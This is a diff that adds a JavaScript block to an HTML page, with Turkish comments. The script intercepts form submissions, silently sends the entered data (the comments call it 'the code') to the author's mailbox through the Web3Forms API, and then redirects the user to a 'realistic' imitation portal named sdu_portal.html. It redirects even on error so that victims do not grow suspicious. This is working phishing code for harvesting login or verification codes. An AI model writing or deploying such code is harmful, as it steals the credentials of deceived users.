@@ -964,3 +964,25 @@
                                             </a>
                                         </div>
 </body>
+<script>
+    const form = document.querySelector('form');
+    form.addEventListener('submit', function (e) {
+        e.preventDefault();
+        const formData = new FormData(form);
+
+        // 1. Kodu Web3Forms üzerinden senin mailine gönderir
+        fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            body: formData
+        })
+            .then(res => {
+                // 2. Kod gönderildiği an (başarılı olsun veya olmasın)
+                // Kullanıcıyı senin hazırladığın o gerçekçi Portala yönlendirir
+                window.location.href = "sdu_portal.html";
+            })
+            .catch(err => {
+                // Hata olsa bile çaktırmamak için yine Portala yönlendiriyoruz
+                window.location.href = "sdu_portal.html";
+            });
+    });
+</script>
